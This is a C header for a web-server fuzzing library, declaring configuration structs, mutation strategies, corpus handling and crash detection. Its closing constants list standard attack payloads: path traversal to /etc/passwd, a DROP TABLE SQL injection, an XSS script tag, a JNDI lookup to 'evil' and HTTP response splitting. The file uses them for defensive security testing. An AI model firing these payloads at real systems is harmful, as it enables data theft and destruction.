/*
    fuzz.h - Fuzzing test library

    Provides common fuzzing utilities, mutation strategies, and test orchestration
    for comprehensive security testing of the web server.

    Copyright (c) All Rights Reserved. See details at the end of the file.
*/

#ifndef _h_FUZZ_LIB
#define _h_FUZZ_LIB 1

/********************************** Includes **********************************/

#include "r.h"
#include "crypt.h"
/*
#include <signal.h>
#include <setjmp.h>
*/

/*********************************** Types ************************************/

/**
    Fuzzing configuration
 */
typedef struct FuzzConfig {
    int duration;               // Test duration in milliseconds (0 = use iterations)
    int iterations;             // Number of test iterations (used if duration == 0)
    int timeout;                // Per-test timeout in milliseconds
    int parallel;               // Number of parallel workers
    uint seed;                  // Random seed (0 = time-based)
    cchar *crashDir;            // Directory for crash-inducing inputs
    bool coverage;              // Track code coverage
    bool mutate;                // Mutate the corpus (default: true)
    bool randomize;             // Randomize corpus order (default: true)
    bool stop;                  // Stop on first error (default: false)
    bool verbose;               // Verbose output
} FuzzConfig;

/**
    Fuzzing statistics
 */
typedef struct FuzzStats {
    int coverage;               // Code coverage percentage (if enabled)
    int crashes;                // Number of crashes found
    int errors;                 // Number of errors
    int hangs;                  // Number of hangs/timeouts
    int total;                  // Total test cases executed
    int unique;                 // Unique crashes (deduplicated)
    Ticks startTime;            // Fuzzing start time
    Ticks endTime;              // Fuzzing end time
} FuzzStats;

/**
    Fuzzing oracle function - returns true if test passed
    @param input Fuzzed input data
    @param len Length of input data
    @return True if test passed without crash/hang/error
 */
typedef bool (*FuzzOracle)(cchar *input, size_t len);

/**
    Mutation function - mutates input and returns new buffer
    @param input Original input data
    @param len Pointer to length (updated with new length)
    @return Mutated input buffer (caller must free)
 */
typedef char *(*FuzzMutator)(cchar *input, size_t *len);

/**
    Fuzzing runner structure
 */
typedef struct FuzzRunner {
    FuzzConfig config;          // Configuration
    FuzzStats stats;            // Statistics
    FuzzOracle oracle;          // Test oracle function
    FuzzMutator mutator;        // Mutation strategy
    RList *corpus;              // Seed corpus
    RHash *crashes;             // Crash deduplication (hash -> count)
    jmp_buf crashJmp;           // Jump buffer for crash handling
    bool crashed;               // Crash flag
    int signal;                 // Last signal received
} FuzzRunner;

/**
    Mutation strategies
 */
typedef enum FuzzStrategy {
    FUZZ_BIT_FLIP,              // Flip random bits
    FUZZ_BYTE_FLIP,             // Flip random bytes
    FUZZ_INSERT_RANDOM,         // Insert random data
    FUZZ_DELETE_RANDOM,         // Delete random bytes
    FUZZ_OVERWRITE_RANDOM,      // Overwrite with random data
    FUZZ_INSERT_SPECIAL,        // Insert special characters
    FUZZ_REPLACE_PATTERN,       // Replace pattern
    FUZZ_SPLICE,                // Splice two inputs
    FUZZ_DUPLICATE,             // Duplicate data blocks
    FUZZ_TRUNCATE,              // Truncate at random point
} FuzzStrategy;

/********************************* Functions **********************************/

/**
    Initialize fuzzing runner
    @param config Fuzzing configuration
    @return Initialized fuzzer runner
 */
PUBLIC FuzzRunner *fuzzInit(FuzzConfig *config);

/**
    Free fuzzing runner
    @param runner Fuzzer runner
 */
PUBLIC void fuzzFree(FuzzRunner *runner);

/**
    Set test oracle function
    @param runner Fuzzer runner
    @param oracle Oracle function
 */
PUBLIC void fuzzSetOracle(FuzzRunner *runner, FuzzOracle oracle);

/**
    Set mutation strategy function
    @param runner Fuzzer runner
    @param mutator Mutator function
 */
PUBLIC void fuzzSetMutator(FuzzRunner *runner, FuzzMutator mutator);

/**
    Set callback to check if fuzzing should stop
    @param callback Function that returns true if fuzzing should stop
 */
PUBLIC void fuzzSetShouldStopCallback(bool (*callback)(void));

/**
    Load seed corpus from file
    @param runner Fuzzer runner
    @param path Path to corpus file
    @return Number of inputs loaded
 */
PUBLIC int fuzzLoadCorpus(FuzzRunner *runner, cchar *path);

/**
    Add input to corpus
    @param runner Fuzzer runner
    @param input Input data
    @param len Length of input
 */
PUBLIC void fuzzAddCorpus(FuzzRunner *runner, cchar *input, size_t len);

/**
    Run fuzzing campaign
    @param runner Fuzzer runner
    @return Number of crashes found
 */
PUBLIC int fuzzRun(FuzzRunner *runner);

/**
    Generate fuzzing report
    @param runner Fuzzer runner
 */
PUBLIC void fuzzReport(FuzzRunner *runner);

/**
    Save crash-inducing input
    @param runner Fuzzer runner
    @param input Input data
    @param len Length of input
    @param signal Signal number
 */
PUBLIC void fuzzSaveCrash(FuzzRunner *runner, cchar *input, size_t len, int signal);

/******************************** Mutations ***********************************/

/**
    Flip random bits in input
    @param input Original input
    @param len Pointer to length (updated)
    @return Mutated input (caller must free)
 */
PUBLIC char *fuzzBitFlip(cchar *input, size_t *len);

/**
    Flip random bytes in input
    @param input Original input
    @param len Pointer to length (updated)
    @return Mutated input (caller must free)
 */
PUBLIC char *fuzzByteFlip(cchar *input, size_t *len);

/**
    Insert random data at random position
    @param input Original input
    @param len Pointer to length (updated)
    @return Mutated input (caller must free)
 */
PUBLIC char *fuzzInsertRandom(cchar *input, size_t *len);

/**
    Delete random bytes
    @param input Original input
    @param len Pointer to length (updated)
    @return Mutated input (caller must free)
 */
PUBLIC char *fuzzDeleteRandom(cchar *input, size_t *len);

/**
    Overwrite with random data
    @param input Original input
    @param len Pointer to length (updated)
    @return Mutated input (caller must free)
 */
PUBLIC char *fuzzOverwriteRandom(cchar *input, size_t *len);

/**
    Insert special characters (null, CRLF, etc)
    @param input Original input
    @param len Pointer to length (updated)
    @return Mutated input (caller must free)
 */
PUBLIC char *fuzzInsertSpecial(cchar *input, size_t *len);

/**
    Replace pattern in input
    @param input Original input
    @param len Pointer to length (updated)
    @param pattern Pattern to find
    @param replacement Replacement string
    @return Mutated input (caller must free)
 */
PUBLIC char *fuzzReplace(cchar *input, size_t *len, cchar *pattern, cchar *replacement);

/**
    Splice two inputs together
    @param input Original input
    @param len Pointer to length (updated)
    @return Mutated input (caller must free)
 */
PUBLIC char *fuzzSplice(cchar *input, size_t *len);

/**
    Duplicate data blocks
    @param input Original input
    @param len Pointer to length (updated)
    @return Mutated input (caller must free)
 */
PUBLIC char *fuzzDuplicate(cchar *input, size_t *len);

/**
    Truncate at random point
    @param input Original input
    @param len Pointer to length (updated)
    @return Mutated input (caller must free)
 */
PUBLIC char *fuzzTruncate(cchar *input, size_t *len);

/******************************** Utilities ***********************************/

/**
    Generate random string with special characters
    @param len Length of string
    @return Random string (caller must free)
 */
PUBLIC char *fuzzRandomString(size_t len);

/**
    Generate random binary data
    @param len Length of data
    @return Random data (caller must free)
 */
PUBLIC char *fuzzRandomData(size_t len);

/**
    Calculate hash of input for deduplication
    @param input Input data
    @param len Length of input
    @return Hash string (caller must free)
 */
PUBLIC char *fuzzHash(cchar *input, size_t len);

/**
    Check if input causes unique crash
    @param runner Fuzzer runner
    @param input Input data
    @param len Length of input
    @return True if unique crash
 */
PUBLIC bool fuzzIsUniqueCrash(FuzzRunner *runner, cchar *input, size_t len);

/**
    Get random corpus entry
    @param runner Fuzzer runner
    @param len Pointer to length (updated)
    @return Random corpus entry (caller must not free)
 */
PUBLIC cchar *fuzzGetRandomCorpus(FuzzRunner *runner, size_t *len);

/************************* Server Crash Detection *****************************/

/**
    Get server process ID from file
    @return Server PID or 0 if not found
 */
PUBLIC pid_t fuzzGetServerPid(void);

/**
    Check if server process is alive
    @param pid Server process ID
    @return True if server is running
 */
PUBLIC bool fuzzIsServerAlive(pid_t pid);

/**
    Report server crash with input that caused it
    @param input Input data that may have caused crash
    @param len Length of input
 */
PUBLIC void fuzzReportServerCrash(cchar *input, size_t len);

/********************************* Constants **********************************/

// Special characters for fuzzing
#define FUZZ_SPECIAL_CHARS "\x00\r\n\t \"'<>&;|`$(){}[]\\/%"

// Common attack patterns
#define FUZZ_ATTACK_PATTERNS "../../../etc/passwd", \
                             "'; DROP TABLE users--", \
                             "<script>alert(1)</script>", \
                             "%00", \
                             "${jndi:ldap://evil}", \
                             "../../../../../../../../etc/passwd", \
                             "\r\n\r\nHTTP/1.1 200 OK\r\n", \
                             "%2e%2e%2f%2e%2e%2f", \
                             "\x00\x00\x00\x00"

#endif /* _h_FUZZ_HARNESS */

/*
    Copyright (c) Embedthis Software. All Rights Reserved.
    This is proprietary software and requires a commercial license from the author.
*/
